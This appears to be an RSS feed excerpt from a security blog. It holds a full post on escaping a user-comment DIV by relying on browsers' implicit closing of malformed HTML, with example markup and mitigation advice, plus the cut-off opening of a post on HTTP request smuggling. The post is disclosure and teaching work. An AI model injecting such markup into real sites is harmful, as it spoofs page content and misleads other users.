			<item>
				<title>Web Security, using bad HTML to escape from a DIV</title>
				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://www.makina-corpus.com/blog/metier/2016/securite-web-utiliser-du-mauvais-html-pour-sevader-dun-div-1&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
&lt;small&gt;estimated read time: 10min&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;Why?&lt;/h2&gt;

&lt;p&gt;Have you ever wondered why you cannot post any HTML on Facebook? It seems so
easy on a lot of websites to submit content containing a small HTML subset, why doesn't Facebook allow it?&lt;/p&gt;

&lt;p&gt;Or maybe you knew that it was possible in Facebook Notes, before April 2014. You
had a little rich text editor where you could type in some HTML tags (both in
wysiwyg and raw mode). But you cannot do that anymore. Now you are forced to use the
wysiwyg mode and even using the API you will see that the very small part of
HTML you can use will always be very very clean. Very few nested levels,
very strict opening/closing policy for tags, no attributes, etc.&lt;/p&gt;

&lt;p&gt;Well, in this article I'll try to explain why. I'll show you how, by simply
playing with &lt;strong&gt;bad HTML syntax&lt;/strong&gt; on a very small subset of HTML, it is easy
for contributed HTML to &lt;strong&gt;evade the box&lt;/strong&gt; and write everywhere on the page.&lt;/p&gt;

&lt;p&gt;This earned me a 1500 USD facebook bounty (and a Github T-shirt). So, yes, it's very
simple but it's still very annoying and real.&lt;/p&gt;

&lt;p&gt;I like to look at &lt;strong&gt;very simple things&lt;/strong&gt; and HTML box evasion is something very
very simple. So simple that most people would not even see why it is a problem.&lt;/p&gt;

&lt;p&gt;So, before reading, keep in mind that this is about HTML contributions and HTML injection, this is
not about XSS or SQL injection. The problem here is:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Can you let the user contribute content formatted with a small subset of HTML?&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Can you ensure the contributed content will stay &lt;em&gt;in the box&lt;/em&gt;, in the dedicated layout subset.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;This impacts every markup language that is rendered to HTML (like
partial HTML, of course, but also markdown, reStructuredText, etc.).&lt;/p&gt;

&lt;h2&gt;So what?&lt;/h2&gt;

&lt;h3&gt;Implicit HTML and the browser fixing your errors&lt;/h3&gt;

&lt;p&gt;When you feed a browser with some HTML, the browser is very kind and will try to
fix a big number of errors that could be present in the page.&lt;/p&gt;

&lt;p&gt;This behavior was a very important part of the web's success. If browsers made a
&lt;em&gt;White-Page-Of-Death&lt;/em&gt; for every HTML syntax error, the web would be really
smaller.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This is cool for the end user.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This is cool for the web developer.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This is bad in terms of security.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;One of the way browsers will fix HTML is by adding closing tags when the
page clearly forgot to close some tags.&lt;/p&gt;

&lt;p&gt;So this:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Is automatically rewritten with closing &lt;code&gt;&amp;lt;/LI&amp;gt;&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LI&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LI&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But let's look at something nastier, we have an opening &lt;code&gt;&amp;lt;DIV&amp;gt;&lt;/code&gt; inside the &lt;code&gt;&amp;lt;LI&amp;gt;&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
             test
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The browser will add the closing DIV:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            test
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Chances are that a &lt;strong&gt;server side output filter&lt;/strong&gt;, filtering HTML contributions
would have &lt;strong&gt;detected&lt;/strong&gt; this HTML as invalid, if you &lt;strong&gt;count opening and closing
tags&lt;/strong&gt; you can detect that a closing tag is missing.&lt;/p&gt;

&lt;p&gt;So our bad contributor will instead write this:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third --&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And &lt;strong&gt;if you count&lt;/strong&gt; the number of closing and opening tags, or if you try to
cleanup this with some regexp (are you crazy?), chances are that this will look
good.&lt;/p&gt;

&lt;p&gt;And now the browser result:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
           &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML - end third--&amp;gt;&lt;/span&gt;
           &lt;span class=&quot;nt&quot;&gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML - end second --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third? no, end foo --&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second? no end foo&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end foo&amp;#39;s parent&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Two &lt;code&gt;&amp;lt;/DIV&amp;gt;&lt;/code&gt; are &lt;strong&gt;impliclty added by the browser&lt;/strong&gt;, because you cannot close
the &lt;code&gt;&amp;lt;LI&amp;gt;&lt;/code&gt; without closing the &lt;code&gt;&amp;lt;DIV&amp;gt;&lt;/code&gt; inside. And now, on the final page, you have
2 extras closing divs !&lt;/p&gt;

&lt;h3&gt;Ok, too many closing divs, and then?&lt;/h3&gt;

&lt;p&gt;If the contributor can enter &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;/div&amp;gt;&lt;/code&gt;, and if you count the number
of closing and opening divs to assume the HTML is correct, &lt;strong&gt;you are wrong&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The HTML is correct only if &lt;strong&gt;the order&lt;/strong&gt; of the opening and closing tags is
correct, if some tags are closed before some others it may break the layout
(it depends of the tags).&lt;/p&gt;

&lt;p&gt;For the contibutors, this means writing outside of the controlled zone (the
user-comment box for example) and adding content, with the subset of HTML that
they are allowed to use, on other parts of the page, maybe playing with &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt;
and &lt;code&gt;&amp;lt;br/&amp;gt;&lt;/code&gt; to fake content on some parts of your layout that other users will
trust more than a spam comment box (see last examples at the end of this text).&lt;/p&gt;

&lt;h2&gt;Demo&lt;/h2&gt;

&lt;p&gt;Below are some iframes that use the implicit DIV closing trick to write one
simple line of text on the &lt;code&gt;main&lt;/code&gt; div, instead of writing it 3 nested DIV
deeper.&lt;/p&gt;

&lt;p&gt;An interesting thing to do is opening these iframes in a new window and looking
at the source. Here is what you'll see if you view the source of the first iframe:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/theme/img/posts/t1_html_source.png&quot;&gt;&lt;/p&gt;

&lt;p&gt;We can see that something wrong was detected and highlighted in red.&lt;/p&gt;

&lt;p&gt;Inspecting the DOM we see how the browser automatcially closes the divs:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/theme/img/posts/t1_html_dom.png&quot;&gt;&lt;/p&gt;

&lt;p&gt;In these examples:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;the goal is to write something &lt;strong&gt;in red&lt;/strong&gt;, in the main div&lt;/li&gt;
&lt;li&gt;somes tests should fail (using &lt;code&gt;&amp;lt;P&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;TD&amp;gt;&lt;/code&gt; &lt;code&gt;&amp;lt;TR&amp;gt;&lt;/code&gt; we do not break the divs
as would most inline tags like &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;strong&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;sub&amp;gt;&lt;/code&gt;, etc.)&lt;/li&gt;
&lt;/ul&gt;


&lt;table&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t1.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t2.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t1.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t2.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t3.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t4.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t3.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t4.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t5.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t6.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t5.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t6.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t7.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t8.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t7.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t8.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t9.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t10.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t9.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t10.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t11.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t12.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t11.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t12.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t13.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t14.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t13.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t14.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t15.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t16.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t15.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t16.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;small&gt;&lt;a href=&quot;///theme/resource/t17.html&quot;&gt;direct link&lt;/a&gt;&lt;/small&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
&lt;iframe src=/theme/resource/t17.html style=&quot;height:450px; width: 350px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;


&lt;p&gt;&lt;strong&gt;H1, H2, H3, PRE, LI&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;These are the tags I prefer because chances are that they are in the list of allowed tags for contributors.&lt;/p&gt;

&lt;h3&gt;Will it break &lt;code&gt;&amp;lt;section&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;article&amp;gt;&lt;/code&gt;?&lt;/h3&gt;

&lt;p&gt;Yes.&lt;/p&gt;

&lt;p&gt;First, if you allow &lt;code&gt;&amp;lt;section&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;article&amp;gt;&lt;/code&gt; in allowed contributors tags, it
will obviously allow the contributor to close such tags, so this would be a very
bad move.&lt;/p&gt;

&lt;p&gt;More generaly, if you use one &lt;code&gt;&amp;lt;DIV&amp;gt;&lt;/code&gt; on your layout, closing this tag will also
close any &lt;code&gt;&amp;lt;section&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;article&amp;gt;&lt;/code&gt; embedded inside.&lt;/p&gt;

&lt;p&gt;Let's see this in action in a more complex layout:&lt;/p&gt;

&lt;p&gt;Here is a new iframe with a full layout, you can see a div around the article.&lt;/p&gt;

&lt;iframe src=/theme/resource/t18.html style=&quot;height:450px; width: 700px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;


&lt;p&gt;And here is this layout after a bad comment closing the comment and main divs (the real aside section and footers are far in the bottom):&lt;/p&gt;

&lt;iframe src=/theme/resource/t19.html style=&quot;height:450px; width: 700px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;


&lt;h3&gt;What if direct HTML is not allowed?&lt;/h3&gt;

&lt;p&gt;If the only way to contribute is Markdown, reStructuredText or other wiki-like syntaxes, you
cannot directly insert bad HTML, in theory.&lt;/p&gt;

&lt;p&gt;Well, for Markdown it depends of the flavor. By default, you can include raw
HTML in Markdown, unless this feature is removed.&lt;/p&gt;

&lt;p&gt;Anyway, with a language generating HTML the game is to find strange syntax in
this language which will generate bad HTML.&lt;/p&gt;

&lt;p&gt;Be careful, preview modes are usually made with syntax parsers written in JavaScript. These
parsers are usually less robust than the real final generators. So a bad syntax
in a preview mode means almost nothing.&lt;/p&gt;

&lt;p&gt;I wont give you specific syntax error examples, it depends on the engine, you'll
have to research on your own.&lt;/p&gt;

&lt;h2&gt;Protections&lt;/h2&gt;

&lt;p&gt;If you want to allow contributions, here are some thoughts:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Why not simply allowing unformatted text?&lt;/li&gt;
&lt;li&gt;Why allowing &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;? If you use &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; in your layout you could in fact
prevent any contributions from using this HTML tag.&lt;/li&gt;
&lt;li&gt;More generally do not allow tags used for your layout structure (like article or section)&lt;/li&gt;
&lt;li&gt;Check your CMS if you CMS provides HTML syntax cleanup (Drupal does, for example)&lt;/li&gt;
&lt;li&gt;Avoid regexps to cleanup (filter) contributed HTML, prefer DOM-based tools
when they are available. These tools will analyze text input, build a dom tree, then
generate HTML output from the tree, so tags will always be in the right order,
and can even be filtered for attributes and id cleanup.&lt;/li&gt;
&lt;li&gt;That said, regexp-based filters might also work and perform the same filtering
task, here is for example &lt;a href=&quot;https://www.drupal.org/project/wysiwyg_filter&quot; title=&quot;Drupal WYSIWYG filter&quot;&gt;a very good drupal7 module, wysiwyg_filter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2016-06-10 00:00:00 +0200</published>
				<link>http://regilero.github.io/security/english/2016/06/10/security_play_with_implicit_html_and_closing_divs/</link>
			</item>
		
			<item>
				<title>Checking HTTP Smuggling issues in 2015 - Part1</title>
				<description>&lt;p&gt;&lt;small&gt; &lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://makina-corpus.com/blog/metier/2015/problemes-de-http-smuggling-contrebandede-http-en-2015-partie-1&quot;&gt;makina corpus&lt;/a&gt;.)&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;The goal of this serie of articles is to explain clearly what are HTTP smuggling
issues and why I think this sort of security issues are critically important and
could be used in massive attacks against modern web services.&lt;/p&gt;

&lt;p&gt;In the last 6 months I've been struggling with the state of several open source HTTP
servers, and helped fixing several issues. The main problem encountered was,
usually, to explain the problem.&lt;/p&gt;

&lt;p&gt;A first big study on smuggling was done in 2005 and lead to several corrections.
This was was done by &lt;strong&gt;Chaim Linhart&lt;/strong&gt;, &lt;strong&gt;Amit Klein&lt;/strong&gt;, &lt;strong&gt;Ronen Heled&lt;/strong&gt; and &lt;strong&gt;Steve Orrin&lt;/strong&gt;,
published by Watchfire and &lt;a href=&quot;http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf&quot; title=&quot;HTTP Request Smuggling - watchfire (pdf)&quot;&gt;still worth a read ten years after&lt;/a&gt;.
Today even the HTTP/1.1 RFC 7230 contains &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot; title=&quot;3.3.3. Message Body Length&quot;&gt;protections&lt;/a&gt;
and &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-9.5&quot; title=&quot;9.5. Request Smuggling&quot;&gt;warnings&lt;/a&gt; against Request Smuggling, but
an RFC is just a reference, things are really different when you check the
implementations. And a lot of people are now starting their own implementations.
